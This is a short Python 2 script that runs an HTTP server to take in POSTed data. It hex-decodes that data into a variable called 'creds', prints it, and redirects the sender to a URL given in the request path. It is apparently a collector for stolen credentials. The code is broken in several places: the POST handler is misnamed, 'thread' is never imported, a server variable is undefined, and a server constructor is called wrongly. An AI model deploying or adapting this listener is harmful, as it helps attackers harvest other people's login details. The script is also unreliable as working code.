import SocketServer
import urllib
import SimpleHTTPServer


server_ip = raw_input('ServerIP address to use: ')
http_port = raw_input('Port to use 0-65535: ')


#  UNCOMMENT to specify constant ip address to use rather than asking the user to provide one.
#server_ip = '127.0.0.1'
#http_port = 1234


class KillMe(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path.startswith('/kill_server'):
            print "Server is going down, run it again manually!"
            def kill_me_please(server):
                server.shutdown()
            thread.start_new_thread(kill_me_please, (httpd,))
            self.send_error(500)

class ConnRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def post_connection_status_(self):
        content_length = int(self.headers['Content-Length'])
        creds = self.rfile.read(content_length).decode('hex')
        print creds
        site = self.path[1:]
        self.send_response(301)
        self.send_header('Location', urllib.unquote(site))
        self.send_head()
        self.end_headers()
server = SocketServer.TCPServer((server_ip, int(http_port)), ConnRequestHandler, KillMe)




print 'To access the webserver visit ' + 'http:' + '//' + server_ip + ':' + str(http_port)
server.serve_forever()
